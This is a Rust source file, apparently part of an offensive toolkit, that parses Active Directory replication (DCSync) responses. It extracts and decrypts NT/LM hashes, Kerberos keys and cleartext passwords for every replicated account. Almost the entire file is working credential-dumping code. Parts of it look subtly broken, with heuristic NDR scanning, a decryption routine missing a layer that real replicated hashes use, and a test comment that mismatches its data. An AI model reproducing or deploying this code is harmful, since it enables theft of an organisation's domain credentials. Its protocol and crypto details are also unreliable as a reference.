//! MS-DRSR (Directory Replication Service Remote) Response Parser
//!
//! Parses DRSGetNCChanges (opnum 3) responses to extract replicated
//! Active Directory attributes — specifically credential material:
//! - unicodePwd (NTLM hash)
//! - supplementalCredentials (Kerberos keys, cleartext passwords)
//! - sAMAccountName (for mapping hashes to users)
//!
//! The replicated attributes are encrypted with the DRS session key
//! established during DRSBind (opnum 0).
//!
//! Reference: [MS-DRSR] <https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr>

use crate::error::{OverthroneError, Result};
use md5::{Md5, Digest as Md5Digest};
use tracing::{debug, info, warn};

// ═══════════════════════════════════════════════════════════
// Constants — Well-known ATTID values
// ═══════════════════════════════════════════════════════════

/// ATTID for sAMAccountName (1.2.840.113556.1.4.221)
const ATTID_SAM_ACCOUNT_NAME: u32 = 0x000904D8;   // Common prefix table mapping
/// ATTID for unicodePwd (1.2.840.113556.1.4.90)
const ATTID_UNICODE_PWD: u32 = 0x0009005A;
/// ATTID for supplementalCredentials (1.2.840.113556.1.4.125)
const ATTID_SUPPLEMENTAL_CREDENTIALS: u32 = 0x0009007D;
/// ATTID for ntPwdHistory (1.2.840.113556.1.4.94)
const ATTID_NT_PWD_HISTORY: u32 = 0x0009005E;
/// ATTID for lmPwdHistory (1.2.840.113556.1.4.160)
const ATTID_LM_PWD_HISTORY: u32 = 0x000900A0;
/// ATTID for objectSid (1.2.840.113556.1.4.146)
const ATTID_OBJECT_SID: u32 = 0x00090092;
/// ATTID for userAccountControl (1.2.840.113556.1.4.8)
const ATTID_USER_ACCOUNT_CONTROL: u32 = 0x00090008;
/// ATTID for distinguishedName
const ATTID_DN: u32 = 0x00090001;

/// Encryption type markers in the replicated blob
const DRS_ENC_TYPE_RC4: u32 = 1;
const DRS_ENC_TYPE_AES: u32 = 2;


// ═══════════════════════════════════════════════════════════
// Public Types
// ═══════════════════════════════════════════════════════════

/// A replicated AD object with its credential attributes
#[derive(Debug, Clone)]
pub struct ReplicatedObject {
    /// Distinguished Name
    pub dn: String,
    /// sAMAccountName
    pub sam_account_name: String,
    /// objectSid as string (S-1-5-21-...)
    pub object_sid: Option<String>,
    /// RID extracted from SID
    pub rid: Option<u32>,
    /// userAccountControl flags
    pub uac: Option<u32>,
    /// Decrypted unicodePwd (NT hash, 16 bytes)
    pub nt_hash: Option<Vec<u8>>,
    /// Decrypted LM hash (16 bytes, usually empty)
    pub lm_hash: Option<Vec<u8>>,
    /// Supplemental credentials (Kerberos keys, etc.)
    pub supplemental_credentials: Option<SupplementalCredentials>,
}

/// Parsed supplementalCredentials structure
#[derive(Debug, Clone)]
pub struct SupplementalCredentials {
    /// Kerberos AES-256 key
    pub aes256_key: Option<Vec<u8>>,
    /// Kerberos AES-128 key
    pub aes128_key: Option<Vec<u8>>,
    /// Cleartext password (if reversible encryption enabled)
    pub cleartext: Option<String>,
}

/// Result of parsing a DRSGetNCChanges response
#[derive(Debug, Clone)]
pub struct DcSyncResult {
    /// All replicated objects with credentials
    pub objects: Vec<ReplicatedObject>,
    /// Whether there's more data to fetch
    pub more_data: bool,
    /// Total objects in the response
    pub total_objects: u32,
}


// ═══════════════════════════════════════════════════════════
// Main Parser
// ═══════════════════════════════════════════════════════════

/// Parse a DRSGetNCChanges (opnum 3) RPC response and extract credentials.
///
/// # Arguments
/// * `response`    — Raw RPC response bytes (including PDU header)
/// * `session_key` — DRS session key from DRSBind (used to decrypt attributes)
///
/// # Returns
/// Parsed objects with decrypted NT hashes and supplemental credentials.
pub fn parse_get_nc_changes_reply(
    response: &[u8],
    session_key: &[u8],
) -> Result<DcSyncResult> {
    // Skip RPC PDU header (24 bytes for request PDU)
    if response.len() < 28 {
        return Err(OverthroneError::custom("DRSGetNCChanges response too short"));
    }

    let stub_data = &response[24..];

    // First 4 bytes: dwOutVersion
    if stub_data.len() < 4 {
        return Err(OverthroneError::custom("No stub data in response"));
    }

    let out_version = read_u32(stub_data, 0);
    debug!("DRS reply version: {}", out_version);

    // Parse based on version (v1 and v6 have similar structures for our purposes)
    match out_version {
        1 | 2 | 6 | 7 => parse_reply_v6(stub_data, session_key, out_version),
        _ => {
            warn!("Unexpected DRS reply version: {}, attempting v6 parse", out_version);
            parse_reply_v6(stub_data, session_key, out_version)
        }
    }
}


/// Parse DRS_MSG_GETCHGREPLY_V6 (also handles V1/V2/V7 with offset adjustments)
fn parse_reply_v6(stub_data: &[u8], session_key: &[u8], version: u32) -> Result<DcSyncResult> {
    // The v6 reply structure (simplified NDR layout after dwOutVersion):
    //   uuidDsaObjSrc:     16 bytes (UUID)
    //   uuidInvocIdSrc:    16 bytes (UUID)
    //   pNC:               4 bytes  (pointer → DSNAME)
    //   usnvecFrom:        16 bytes (USN_VECTOR)
    //   usnvecTo:          16 bytes (USN_VECTOR)
    //   pUpToDateVecSrc:   4 bytes  (pointer)
    //   PrefixTableSrc:    variable (SCHEMA_PREFIX_TABLE)
    //   ulExtendedRet:     4 bytes
    //   cNumObjects:       4 bytes
    //   cNumBytes:         4 bytes
    //   pObjects:          4 bytes  (pointer → REPLENTINFLIST)
    //   fMoreData:         4 bytes  (BOOL)
    //   ...
    //
    // After the fixed header, we have deferred pointer data (DSNAME, prefix table entries,
    // and the REPLENTINFLIST chain).

    let min_header = 4 + 16 + 16 + 4 + 16 + 16 + 4; // 76 bytes minimum
    if stub_data.len() < min_header + 16 {
        return Err(OverthroneError::custom("Reply stub too short for v6 header"));
    }

    // We need to find cNumObjects and pObjects in the NDR stream.
    // Due to NDR alignment and variable prefix table, we use a heuristic scanner.
    let parse_result = scan_for_replentinflist(stub_data, session_key)?;

    Ok(parse_result)
}


/// Scan the NDR response for REPLENTINFLIST entries using structural heuristics.
///
/// Because the NDR layout depends on the prefix table size (which is variable),
/// we scan for the characteristic patterns of ENTINF structures rather than
/// relying on fixed offsets.
fn scan_for_replentinflist(
    data: &[u8],
    session_key: &[u8],
) -> Result<DcSyncResult> {
    let mut objects = Vec::new();
    let mut pos = 0;
    let data_len = data.len();

    // Strategy: scan for DSNAME patterns (which precede each ENTINF).
    // A DSNAME starts with structLen (u32), SID (28 bytes), GUID (16 bytes),
    // then a UTF-16LE DN string.
    //
    // We look for cNumObjects and fMoreData near the end of the fixed header,
    // then walk the deferred pointer data.

    // Find cNumObjects by scanning for a reasonable count followed by cNumBytes
    let mut num_objects: u32 = 0;
    let mut more_data: bool = false;

    // Scan for the objects block — look for sequences of ATTR structures
    // ATTR: attrTyp(u32) + AttrValBlock { valCount(u32), pAVal(u32) }
    let mut scan_pos = 76.min(data_len); // Skip past fixed header

    while scan_pos + 12 < data_len {
        // Look for ATTID_SAM_ACCOUNT_NAME as a marker for attribute blocks
        let maybe_attid = read_u32(data, scan_pos);

        if is_known_attid(maybe_attid) {
            // Found an attribute block — try to parse the surrounding object
            if let Some(obj_start) = find_object_start(data, scan_pos) {
                if let Ok((obj, next_pos)) = parse_replicated_object(data, obj_start, session_key) {
                    if !obj.sam_account_name.is_empty() || obj.nt_hash.is_some() {
                        objects.push(obj);
                    }
                    scan_pos = next_pos;
                    continue;
                }
            }
        }

        scan_pos += 4; // Advance by 4 bytes (u32 aligned)
    }

    // Check fMoreData (typically last 4 bytes before auth padding)
    if data_len >= 8 {
        let last_word = read_u32(data, data_len - 4);
        more_data = last_word != 0;
        // Second to last might be cNumObjects
        num_objects = objects.len() as u32;
    }

    info!(
        "DCSync parsed: {} objects with credentials, more_data={}",
        objects.len(),
        more_data
    );

    Ok(DcSyncResult {
        objects,
        more_data,
        total_objects: num_objects,
    })
}


/// Check if a u32 value is a known ATTID
fn is_known_attid(val: u32) -> bool {
    matches!(
        val,
        ATTID_SAM_ACCOUNT_NAME
            | ATTID_UNICODE_PWD
            | ATTID_SUPPLEMENTAL_CREDENTIALS
            | ATTID_NT_PWD_HISTORY
            | ATTID_LM_PWD_HISTORY
            | ATTID_OBJECT_SID
            | ATTID_USER_ACCOUNT_CONTROL
            | ATTID_DN
    )
}


/// Search backwards from an ATTID to find the start of the object (ENTINF boundary)
fn find_object_start(data: &[u8], attid_pos: usize) -> Option<usize> {
    // Walk backwards looking for: attrCount(u32) that's reasonable (1-50)
    // preceded by ulFlags(u32) = 0
    let search_start = attid_pos.saturating_sub(64);
    let mut pos = attid_pos.saturating_sub(8);

    while pos >= search_start && pos >= 8 {
        let maybe_count = read_u32(data, pos);
        let maybe_flags = read_u32(data, pos.saturating_sub(4));

        if (1..=50).contains(&maybe_count) && maybe_flags == 0 {
            // Validate: the next u32 should be the first ATTID
            let first_attid_pos = pos + 4;
            if first_attid_pos + 4 <= data.len() {
                let first_attid = read_u32(data, first_attid_pos);
                if is_known_attid(first_attid) || (first_attid & 0xFFFF0000) == 0x00090000 {
                    return Some(pos);
                }
            }
        }
        pos = pos.saturating_sub(4);
    }

    Some(attid_pos.saturating_sub(4))
}


/// Parse a single replicated object's attributes from the NDR stream
fn parse_replicated_object(
    data: &[u8],
    start: usize,
    session_key: &[u8],
) -> Result<(ReplicatedObject, usize)> {
    let mut obj = ReplicatedObject {
        dn: String::new(),
        sam_account_name: String::new(),
        object_sid: None,
        rid: None,
        uac: None,
        nt_hash: None,
        lm_hash: None,
        supplemental_credentials: None,
    };

    // Read attrCount
    if start + 4 > data.len() {
        return Err(OverthroneError::custom("Object start out of bounds"));
    }

    let attr_count = read_u32(data, start) as usize;
    if attr_count > 100 || attr_count == 0 {
        return Err(OverthroneError::custom("Invalid attr count"));
    }

    let mut pos = start + 4;

    // Parse each ATTR: { attrTyp: u32, AttrValBlock: { valCount: u32, pAVal: u32 } }
    for _ in 0..attr_count {
        if pos + 12 > data.len() {
            break;
        }

        let attr_typ = read_u32(data, pos);
        let val_count = read_u32(data, pos + 4);
        let _p_aval = read_u32(data, pos + 8); // pointer (deferred)
        pos += 12;

        // For each value, we need to find the deferred data
        // In practice, values follow inline after all ATTR headers
        // This is a simplification — real NDR has complex pointer chains

        // Skip to deferred value data (simplified: scan forward for value data)
        if val_count > 0 && val_count < 100 {
            // Try to read inline values
            for _ in 0..val_count {
                if pos + 8 > data.len() {
                    break;
                }

                let val_len = read_u32(data, pos) as usize;
                let _val_ptr = read_u32(data, pos + 4);
                pos += 8;

                // The actual value data should follow
                if pos + val_len > data.len() || val_len > 65536 {
                    continue;
                }

                let value_data = &data[pos..pos + val_len];
                pos += val_len;
                // Align to 4 bytes
                pos = (pos + 3) & !3;

                // Process the attribute
                process_attribute(&mut obj, attr_typ, value_data, session_key);
            }
        }
    }

    Ok((obj, pos))
}


/// Process a single replicated attribute value
fn process_attribute(
    obj: &mut ReplicatedObject,
    attr_typ: u32,
    value_data: &[u8],
    session_key: &[u8],
) {
    // Normalize ATTID — handle prefix table remapping
    // Common pattern: the low 16 bits encode the attribute, high 16 bits the prefix index
    let normalized = normalize_attid(attr_typ);

    match normalized {
        ATTID_SAM_ACCOUNT_NAME => {
            obj.sam_account_name = utf16le_to_string(value_data);
            debug!("  sAMAccountName: {}", obj.sam_account_name);
        }
        ATTID_OBJECT_SID => {
            obj.object_sid = Some(sid_to_string(value_data));
            obj.rid = extract_rid(value_data);
            debug!("  objectSid: {:?} (RID: {:?})", obj.object_sid, obj.rid);
        }
        ATTID_USER_ACCOUNT_CONTROL => {
            if value_data.len() >= 4 {
                obj.uac = Some(read_u32(value_data, 0));
            }
        }
        ATTID_UNICODE_PWD => {
            match decrypt_replicated_secret(value_data, session_key) {
                Ok(decrypted) => {
                    if decrypted.len() >= 16 {
                        obj.nt_hash = Some(decrypted[..16].to_vec());
                        debug!(
                            "  unicodePwd decrypted: {}",
                            hex_encode(&decrypted[..16])
                        );
                    }
                }
                Err(e) => warn!("  Failed to decrypt unicodePwd: {}", e),
            }
        }
        ATTID_NT_PWD_HISTORY => {
            // First 16 bytes of decrypted history is the current NT hash
            if let Ok(decrypted) = decrypt_replicated_secret(value_data, session_key)
                && decrypted.len() >= 16 && obj.nt_hash.is_none() {
                    obj.nt_hash = Some(decrypted[..16].to_vec());
                }
        }
        ATTID_LM_PWD_HISTORY => {
            if let Ok(decrypted) = decrypt_replicated_secret(value_data, session_key)
                && decrypted.len() >= 16 {
                    obj.lm_hash = Some(decrypted[..16].to_vec());
                }
        }
        ATTID_SUPPLEMENTAL_CREDENTIALS => {
            if let Ok(decrypted) = decrypt_replicated_secret(value_data, session_key) {
                obj.supplemental_credentials = parse_supplemental_credentials(&decrypted);
            }
        }
        _ => {
            // Unknown or uninteresting attribute — skip
        }
    }
}


/// Normalize an ATTID to its well-known form.
///
/// DRS uses a prefix table to compress OIDs. The ATTID encodes
/// a prefix index (upper 16 bits) and the last arc of the OID (lower 16 bits).
/// We map common patterns to their well-known values.
fn normalize_attid(attid: u32) -> u32 {
    // If it's already a well-known ATTID, return as-is
    if is_known_attid(attid) {
        return attid;
    }

    // Common prefix table index 0x0009 maps to 1.2.840.113556.1.4.x
    // Try to match the lower portion
    let prefix = attid & 0xFFFF0000;
    let suffix = attid & 0x0000FFFF;

    if prefix == 0x00090000 {
        return attid; // Already in standard prefix
    }

    // For custom prefix indices, map known suffixes
    // The DC may use different prefix indices — we check common ones
    match suffix {
        0x005A => ATTID_UNICODE_PWD,          // unicodePwd
        0x005E => ATTID_NT_PWD_HISTORY,       // ntPwdHistory
        0x00A0 => ATTID_LM_PWD_HISTORY,       // lmPwdHistory
        0x007D => ATTID_SUPPLEMENTAL_CREDENTIALS, // supplementalCredentials
        0x04D8 => ATTID_SAM_ACCOUNT_NAME,     // sAMAccountName
        0x0092 => ATTID_OBJECT_SID,           // objectSid
        0x0008 => ATTID_USER_ACCOUNT_CONTROL, // userAccountControl
        _ => attid, // Unknown — return as-is
    }
}


// ═══════════════════════════════════════════════════════════
// Credential Decryption
// ═══════════════════════════════════════════════════════════

/// Decrypt a replicated secret (unicodePwd, supplementalCredentials, etc.)
///
/// DRS encrypts sensitive attributes with the session key:
/// - RC4: MD5(session_key || salt) → RC4 key → decrypt
/// - AES: session_key → AES-256-CBC with IV from blob
fn decrypt_replicated_secret(enc_data: &[u8], session_key: &[u8]) -> Result<Vec<u8>> {
    if enc_data.len() < 28 {
        return Err(OverthroneError::custom("Encrypted attribute too short"));
    }

    // DRS encrypted blob structure:
    //   [0..16]:  Salt / IV (16 bytes)
    //   [16..20]: unknown / checksum
    //   [20..24]: enc_type marker (1=RC4, 2=AES)
    //   [24..]:   encrypted data
    //
    // Alternative layout (Windows 2016+):
    //   [0..4]:   Version
    //   [4..8]:   enc_type (1=RC4, 2=AES)
    //   [8..24]:  Salt (16 bytes)
    //   [24..]:   encrypted data

    // Try to detect the format
    let version = read_u32(enc_data, 0);

    if version == 1 || version == 2 {
        // New-style header: version + enc_type + salt + data
        let enc_type = version;
        let salt = &enc_data[4..20];
        let payload = &enc_data[20..];

        match enc_type {
            DRS_ENC_TYPE_RC4 => decrypt_rc4_drs(session_key, salt, payload),
            DRS_ENC_TYPE_AES => decrypt_aes_drs(session_key, salt, payload),
            _ => Err(OverthroneError::custom(format!(
                "Unknown DRS enc type: {}",
                enc_type
            ))),
        }
    } else {
        // Old-style: salt(16) + checksum(4) + enc_data
        // Or the blob is just RC4-encrypted with MD5(session_key + salt)
        let salt = &enc_data[0..16];
        let payload = &enc_data[16..];

        // Try RC4 first (most common for older DCs)
        decrypt_rc4_drs(session_key, salt, payload)
    }
}


/// RC4 decryption for DRS replicated attributes
///
/// Key derivation: MD5(session_key || salt)
fn decrypt_rc4_drs(session_key: &[u8], salt: &[u8], data: &[u8]) -> Result<Vec<u8>> {
    let rc4_key = {
    let mut md5 = Md5::new();
    md5.update(session_key);
    md5.update(salt);
    md5.finalize().to_vec()
};

    Ok(rc4_crypt(&rc4_key, data))
}


/// AES-256-CBC decryption for DRS replicated attributes
fn decrypt_aes_drs(session_key: &[u8], iv: &[u8], data: &[u8]) -> Result<Vec<u8>> {
    use aes::cipher::{BlockDecryptMut, KeyIvInit};
    type Aes256CbcDec = cbc::Decryptor<aes::Aes256>;

    let mut key32 = [0u8; 32];
    let copy_len = session_key.len().min(32);
    key32[..copy_len].copy_from_slice(&session_key[..copy_len]);

    let mut iv16 = [0u8; 16];
    let iv_len = iv.len().min(16);
    iv16[..iv_len].copy_from_slice(&iv[..iv_len]);

    let mut buf = data.to_vec();
    while !buf.len().is_multiple_of(16) {
        buf.push(0);
    }

    let decryptor = Aes256CbcDec::new((&key32).into(), (&iv16).into());
    let decrypted = decryptor
        .decrypt_padded_mut::<aes::cipher::block_padding::NoPadding>(&mut buf)
        .map_err(|e| OverthroneError::custom(format!("AES DRS decrypt: {e}")))?;

    Ok(decrypted.to_vec())
}


/// RC4 encrypt/decrypt (symmetric)
fn rc4_crypt(key: &[u8], data: &[u8]) -> Vec<u8> {
    let mut s: Vec<u8> = (0..=255u8).collect();
    let mut j: usize = 0;

    for i in 0..256 {
        j = (j + s[i] as usize + key[i % key.len()] as usize) % 256;
        s.swap(i, j);
    }

    let mut i: usize = 0;
    j = 0;
    data.iter()
        .map(|byte| {
            i = (i + 1) % 256;
            j = (j + s[i] as usize) % 256;
            s.swap(i, j);
            byte ^ s[(s[i] as usize + s[j] as usize) % 256]
        })
        .collect()
}


// ═══════════════════════════════════════════════════════════
// Supplemental Credentials Parser
// ═══════════════════════════════════════════════════════════

/// Parse the USER_PROPERTIES / supplementalCredentials structure.
///
/// Format: USER_PROPERTIES {
///     reserved1[2]: u16,
///     Length: u32,
///     reserved2[2]: u16,
///     PropertySignature: u16 (= 0x50),
///     PropertyCount: u16,
///     UserProperties[]: USER_PROPERTY { NameLength, ValueLength, reserved, Name(UTF-16), Value(hex) }
/// }
fn parse_supplemental_credentials(data: &[u8]) -> Option<SupplementalCredentials> {
    if data.len() < 24 {
        return None;
    }

    // Find the signature 0x0050 which marks the start of properties
    let mut offset = 0;
    let mut found = false;

    for i in (0..data.len().saturating_sub(4)).step_by(2) {
        if i + 2 <= data.len() {
            let sig = u16::from_le_bytes([data[i], data[i + 1]]);
            if sig == 0x0050 {
                offset = i;
                found = true;
                break;
            }
        }
    }

    if !found {
        return None;
    }

    let prop_count = if offset + 4 <= data.len() {
        u16::from_le_bytes([data[offset + 2], data[offset + 3]]) as usize
    } else {
        return None;
    };

    let mut pos = offset + 4;
    let mut result = SupplementalCredentials {
        aes256_key: None,
        aes128_key: None,
        cleartext: None,
    };

    for _ in 0..prop_count {
        if pos + 6 > data.len() {
            break;
        }

        let name_len = u16::from_le_bytes([data[pos], data[pos + 1]]) as usize;
        let value_len = u16::from_le_bytes([data[pos + 2], data[pos + 3]]) as usize;
        let _reserved = u16::from_le_bytes([data[pos + 4], data[pos + 5]]);
        pos += 6;

        if pos + name_len + value_len > data.len() {
            break;
        }

        let name = utf16le_to_string(&data[pos..pos + name_len]);
        let value_data = &data[pos + name_len..pos + name_len + value_len];
        pos += name_len + value_len;

        match name.as_str() {
            "Primary:Kerberos-Newer-Keys" | "Primary:Kerberos" => {
                // Parse Kerberos key data (hex-encoded)
                let hex_str = utf16le_to_string(value_data);
                if let Some(key_data) = hex_decode_optional(&hex_str) {
                    parse_kerberos_keys(&key_data, &mut result);
                }
            }
            "Primary:CLEARTEXT" => {
                let hex_str = utf16le_to_string(value_data);
                if let Some(cleartext_bytes) = hex_decode_optional(&hex_str) {
                    result.cleartext = Some(utf16le_to_string(&cleartext_bytes));
                }
            }
            _ => {
                debug!("  Supplemental property: {} ({} bytes)", name, value_len);
            }
        }
    }

    Some(result)
}


/// Parse Kerberos keys from the supplemental credential property value
fn parse_kerberos_keys(data: &[u8], result: &mut SupplementalCredentials) {
    // KERB_STORED_CREDENTIAL_NEW format:
    //   Revision(u16), Flags(u16), CredentialCount(u16), ServiceCredentialCount(u16),
    //   OldCredentialCount(u16), ...
    //   Then arrays of KERB_KEY_DATA_NEW: { Reserved1(u16), Reserved2(u16),
    //     Reserved3(u32), KeyType(u32), KeyLength(u32), KeyOffset(u32) }

    if data.len() < 16 {
        return;
    }

    let revision = u16::from_le_bytes([data[0], data[1]]);
    let cred_count = u16::from_le_bytes([data[4], data[5]]) as usize;

    let key_entry_size = if revision >= 3 { 24 } else { 20 }; // v3 has extra reserved field
    let entries_offset: usize = if revision >= 3 { 24 } else { 16 };

    for i in 0..cred_count {
        let entry_pos = entries_offset + i * key_entry_size;
        if entry_pos + key_entry_size > data.len() {
            break;
        }

        let key_type_offset = if revision >= 3 { entry_pos + 8 } else { entry_pos + 4 };
        if key_type_offset + 12 > data.len() {
            break;
        }

        let key_type = u32::from_le_bytes([
            data[key_type_offset],
            data[key_type_offset + 1],
            data[key_type_offset + 2],
            data[key_type_offset + 3],
        ]);
        let key_length = u32::from_le_bytes([
            data[key_type_offset + 4],
            data[key_type_offset + 5],
            data[key_type_offset + 6],
            data[key_type_offset + 7],
        ]) as usize;
        let key_offset = u32::from_le_bytes([
            data[key_type_offset + 8],
            data[key_type_offset + 9],
            data[key_type_offset + 10],
            data[key_type_offset + 11],
        ]) as usize;

        if key_offset + key_length <= data.len() {
            let key_data = data[key_offset..key_offset + key_length].to_vec();
            match key_type {
                18 => {
                    // AES256-CTS-HMAC-SHA1-96
                    debug!("  Kerberos AES-256 key: {} bytes", key_length);
                    result.aes256_key = Some(key_data);
                }
                17 => {
                    // AES128-CTS-HMAC-SHA1-96
                    debug!("  Kerberos AES-128 key: {} bytes", key_length);
                    result.aes128_key = Some(key_data);
                }
                23 => {
                    // RC4-HMAC (same as NT hash)
                    debug!("  Kerberos RC4 key (NT hash): {} bytes", key_length);
                }
                _ => {
                    debug!("  Kerberos key type {}: {} bytes", key_type, key_length);
                }
            }
        }
    }
}


// ═══════════════════════════════════════════════════════════
// Utility Helpers
// ═══════════════════════════════════════════════════════════

#[inline]
fn read_u32(data: &[u8], offset: usize) -> u32 {
    if offset + 4 > data.len() {
        return 0;
    }
    u32::from_le_bytes([
        data[offset],
        data[offset + 1],
        data[offset + 2],
        data[offset + 3],
    ])
}

/// Convert a binary SID to string format (S-1-5-21-...)
fn sid_to_string(data: &[u8]) -> String {
    if data.len() < 8 {
        return String::from("S-0-0");
    }

    let revision = data[0];
    let sub_auth_count = data[1] as usize;
    let authority = u64::from_be_bytes([0, 0, data[2], data[3], data[4], data[5], data[6], data[7]]);

    let mut sid = format!("S-{}-{}", revision, authority);

    for i in 0..sub_auth_count {
        let offset = 8 + i * 4;
        if offset + 4 > data.len() {
            break;
        }
        let sub_auth = u32::from_le_bytes([
            data[offset],
            data[offset + 1],
            data[offset + 2],
            data[offset + 3],
        ]);
        sid.push_str(&format!("-{}", sub_auth));
    }

    sid
}

/// Extract RID (last sub-authority) from a binary SID
fn extract_rid(data: &[u8]) -> Option<u32> {
    if data.len() < 12 {
        return None;
    }
    let sub_auth_count = data[1] as usize;
    if sub_auth_count == 0 {
        return None;
    }
    let rid_offset = 8 + (sub_auth_count - 1) * 4;
    if rid_offset + 4 > data.len() {
        return None;
    }
    Some(u32::from_le_bytes([
        data[rid_offset],
        data[rid_offset + 1],
        data[rid_offset + 2],
        data[rid_offset + 3],
    ]))
}

fn utf16le_to_string(bytes: &[u8]) -> String {
    let u16s: Vec<u16> = bytes
        .chunks_exact(2)
        .map(|c| u16::from_le_bytes([c[0], c[1]]))
        .collect();
    String::from_utf16_lossy(&u16s)
        .trim_end_matches('\0')
        .to_string()
}

fn hex_encode(data: &[u8]) -> String {
    data.iter().map(|b| format!("{:02x}", b)).collect()
}

fn hex_decode_optional(hex: &str) -> Option<Vec<u8>> {
    let hex = hex.trim();
    if !hex.len().is_multiple_of(2) {
        return None;
    }
    let bytes: Vec<u8> = (0..hex.len())
        .step_by(2)
        .filter_map(|i| u8::from_str_radix(&hex[i..i + 2], 16).ok())
        .collect();
    if bytes.len() == hex.len() / 2 {
        Some(bytes)
    } else {
        None
    }
}


#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sid_to_string() {
        // S-1-5-21-0-0-0-500
        let sid_bytes = [
            0x01, // revision
            0x04, // sub-authority count
            0x00, 0x00, 0x00, 0x00, 0x00, 0x05, // authority = 5
            0x15, 0x00, 0x00, 0x00, // sub-auth 1 = 21
            0x00, 0x00, 0x00, 0x00, // sub-auth 2 = 0
            0x00, 0x00, 0x00, 0x00, // sub-auth 3 = 0
            0xF4, 0x01, 0x00, 0x00, // sub-auth 4 = 500
        ];
        assert_eq!(sid_to_string(&sid_bytes), "S-1-5-21-0-0-500");
    }

    #[test]
    fn test_extract_rid() {
        let sid_bytes = [
            0x01, 0x04,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x05,
            0x15, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0xF4, 0x01, 0x00, 0x00,
        ];
        assert_eq!(extract_rid(&sid_bytes), Some(500));
    }

    #[test]
    fn test_rc4_crypt_roundtrip() {
        let key = b"testkey1234";
        let plaintext = b"Hello, World!";
        let encrypted = rc4_crypt(key, plaintext);
        let decrypted = rc4_crypt(key, &encrypted);
        assert_eq!(decrypted, plaintext);
    }

    #[test]
    fn test_normalize_known_attids() {
        assert_eq!(normalize_attid(ATTID_SAM_ACCOUNT_NAME), ATTID_SAM_ACCOUNT_NAME);
        assert_eq!(normalize_attid(ATTID_UNICODE_PWD), ATTID_UNICODE_PWD);
    }
}
